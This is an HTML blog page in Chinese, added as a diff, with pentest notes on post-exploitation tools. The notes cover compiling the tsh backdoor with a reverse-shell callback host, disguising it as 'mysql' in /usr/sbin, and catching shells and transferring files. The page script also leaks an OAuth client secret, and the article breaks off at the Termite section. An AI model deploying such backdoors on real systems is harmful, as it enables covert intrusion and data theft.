@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="whip1ash&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  <meta name="google-site-verification" content="Jn3GoSbAsK1naf6utvvBn1NniTRbPspDlWKN6rjfHNI" />
+  <meta name="google-site-verification" content="U05PlKKB3jyiKQ6gkPfsh9R5SUeWyo4Lml44hId45VI" />
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权) | whip1ash
+    
+  </title>
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+  <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdn.bootcss.com/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+  <script src="/js/qrious.js"></script>
+<script src="/js/gitment.js"></script>
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>whip1ash</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)</h2>
+  <p class="post-date">2018-10-30</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="后渗透的数个工具使用与坑点-tsh-termite-cobaltstrike-常见提权"><a href="#后渗透的数个工具使用与坑点-tsh-termite-cobaltstrike-常见提权" class="headerlink" title="后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)"></a>后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>在某个项目中，getshell后发现了大规模内网，突然发现已经非常久没有见过正儿八经的内网了（我知道是我菜）…….好多企业现在把业务的内网放在云上，组成云内网（工作经验的感觉是这样的，不知道实际情况如何）。这次getshell发现内网后却发现：鸡儿，老子不会内网渗透了，遂重新学之。</p>
+<h2 id="tsh-https-github-com-orangetw-tsh"><a href="#tsh-https-github-com-orangetw-tsh" class="headerlink" title="tsh - https://github.com/orangetw/tsh"></a>tsh - <a href="https://github.com/orangetw/tsh" target="_blank" rel="external">https://github.com/orangetw/tsh</a></h2><p>tsh是orange写的后门.<br>github上的readme与实际有点不一样。<br>需要编译，默认是反向shell的模式。<br><code>./complie.sh os[操作系统类型] bc_host[反向shell连接的ip] bc_port[通信端口] [密码] [延迟时间]</code></p>
+<p>使用Mac 10.13.6 xcode自带的gcc编译报错。<br><img src="/media/15409018314412.jpg" alt=""></p>
+<p><strong>注释掉tshd.c的23行，在osx下可以正常编译。</strong></p>
+<p>我在实际用的时候是直接在linux下编译的。经过实战，tsh还是非常稳的，使用tsh的文件传输下载一个6G多的大文件，可以正常下载，丢包不是非常厉害，可以解压出来大部分文件。</p>
+<p>在跳板机上使用wget将tshd文件下载下来，赋予执行权限，更名为mysql，放到<code>/usr/sbin/</code>的目录下，后台运行！</p>
+<p>在vps上只需要执行<code>tsh -cb</code>，等待反向shell的链接就行了。这次遇到了一个比较坑的问题，客户的服务器的sshd设置的超时时间特别短，大概在60s？60s不操作的话就自动logout了。很蛋疼，如果要改的话需要重启sshd，因为是线上环境，没敢改。(大佬说只需要导出一个变量就好了<code>export TMOUT=0</code>)</p>
+<p>上传跟下载文件，如下所示，在反向shell中只需要吧<hostname>换成cb就行了。</hostname></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh &lt;hostname&gt; get &lt;要下载的文件&gt; &lt;本地路径&gt;./tsh &lt;hostname&gt; put &lt;要上传的文件&gt; &lt;远程路劲&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="termite-http-rootkiter-com-Termite"><a href="#termite-http-rootkiter-com-Termite" class="headerlink" title="termite - http://rootkiter.com/Termite/"></a>termite - <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></h2><p>termite是EarthWorm作者的开发的另一款边界穿透工具，朋友推荐给我的，功能还是很强大的，但是当时因为没有解决shell的auto logout的问题，所以经常不知道是不是掉线了，需要重启admin程序才知道，所以还是有一点蛋疼的。</p>
+<p>首先在</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#渗透技巧" >
+    <span class="tag-code">渗透技巧</span>
+  </a>
+
+  <a href="/tags#内网渗透" >
+    <span class="tag-code">内网渗透</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    <div class="qrcode">
+      <canvas id="share-qrcode"></canvas>
+      <p class="notice">扫描二维码，分享此文章</p>
+    </div>
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#后渗透的数个工具使用与坑点-tsh-termite-cobaltstrike-常见提权"><span class="toc-nav-text">后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Intro"><span class="toc-nav-text">Intro</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#tsh-https-github-com-orangetw-tsh"><span class="toc-nav-text">tsh - https://github.com/orangetw/tsh</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#termite-http-rootkiter-com-Termite"><span class="toc-nav-text">termite - http://rootkiter.com/Termite/</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://whip1ash.github.io/2018/10/30/intranet-penetration/';
+    var banner = 'undefined'
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+     // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+        
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+
+    // qrcode
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+
+    // gitment
+    var gitmentConfig = "whip1ash";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)",
+        owner: "whip1ash",
+        repo: "whip1ash.github.io",
+        oauth: {
+          client_id: "ae16d933c78b6cc642c8",
+          client_secret: "e9045e51de8f846b89b22e347cd34d1fe345c533"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  })();
+</script>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2018 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine == 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+<script src="/js/script.js"></script>
+  </body>
+</html>
